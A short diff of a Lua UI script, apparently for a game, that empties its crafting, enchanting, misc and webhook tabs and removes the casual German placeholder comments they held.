@@ -2204,9 +2191,7 @@ local elements = {
             end,
         }),
     },
-    crafting = {
-        -- ab hier ist alles gefckt :sob:
-    },
+    crafting = {},
     teleport = {
         tabs.teleport:Section({
             Title = "Teleport on Join",
@@ -2255,15 +2240,9 @@ local elements = {
             end,
         }),
     },
-    enchanting = {
-        -- rip x2
-    },
-    misc = {
-        -- rip x3
-    },
-    webhook = {
-        -- jetzt mach ich das auch ausserhalb also ehrlich
-    },
+    enchanting = {},
+    misc = {},
+    webhook = {},
     info = {
         tabs.info:Section({
             Title = "Info",
